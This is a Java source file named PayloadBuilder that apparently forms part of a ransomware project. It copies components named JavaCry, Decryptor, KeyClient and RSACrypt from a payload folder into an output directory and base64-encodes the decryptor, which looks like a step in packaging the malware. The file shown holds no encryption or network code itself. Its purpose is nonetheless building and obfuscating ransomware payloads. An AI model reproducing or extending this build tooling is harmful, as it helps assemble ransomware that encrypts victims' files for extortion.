import java.io.File;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.file.Path;
import java.nio.file.Paths;


public class PayloadBuilder {
    private String workingDir = "../../output/";
    private String payloadDir = "../../Payload/";

    public String getWorkingDir() {
        return workingDir;
    }
    public String getPayloadDir() {
        return payloadDir;
    }

    public void copyAllPayloads(){
        try {
            Files.copy(new FileInputStream(new File(payloadDir + "Decryptor.java")), Paths.get(workingDir, "Decryptor.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "JavaCry.java")), Paths.get(workingDir, "JavaCry.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "KeyClient.java")), Paths.get(workingDir, "KeyClient.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "RSACrypt.java")), Paths.get(workingDir, "RSACrypt.java"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(new FileInputStream(new File(payloadDir + "manifest.txt")), Paths.get(workingDir, "manifest.txt"), StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {
            System.out.println(e);
        }     
        
    }

    public static void main(String[] args) {
        Base64Tools b64 = new Base64Tools();
        PayloadBuilder builder = new PayloadBuilder();
        builder.copyAllPayloads();
        System.out.println(b64.FileToB64(new File(builder.getWorkingDir() + "Decryptor.java")));
    }
}